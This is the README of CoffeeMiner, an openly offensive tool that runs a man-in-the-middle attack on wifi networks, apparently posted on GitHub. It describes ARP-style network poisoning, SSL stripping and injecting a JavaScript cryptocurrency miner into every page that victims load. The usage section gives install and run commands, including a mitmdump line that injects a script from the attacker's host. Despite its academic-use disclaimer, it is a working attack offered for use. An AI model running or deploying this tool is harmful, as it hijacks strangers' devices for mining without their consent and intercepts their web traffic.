# CoffeeMiner

Collaborative (mitm) cryptocurrency mining pool in wifi networks

**Warning: this project is for academic/research purposes only.**

A blog post about this project can be read here: http://arnaucode.com/blog/coffeeminer-hacking-wifi-cryptocurrency-miner.html

![coffeeMiner](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-logo-small.png "coffeeMiner")

## Concept
- Performs a MITM attack to all selected victims
- Injects a js script in all the HTML pages requested by the victims
- The js script injected contains a cryptocurrency miner
- All the devices victims connected to the Lan network, will be mining for the CoffeeMiner
- Poisons entire network using 'nmap -sn' to find active IPs
- Uses SSLStrip functionality (experimental)

## Use
- install.sh
```
bash install.sh
```
- edit whitelist.txt with one IP per line (optional)
- edit coffeeMiner.py config, beginning line 3:
```py
os.system("~/.local/bin/mitmdump -s 'sslstrip_injector.py http://[YOUR_IP_HERE]:8000/script.js' -T")
```
- execute coffeeMiner.py
```
python3 coffeeMiner.py ipgateway
```

![network](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-network-attack.png "network")


A complete instructions for academic scenario can be found in https://github.com/arnaucode/coffeeMiner/blob/master/virtualbox_scenario_instructions.md



![demo](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-demo-cutted.gif "demo")
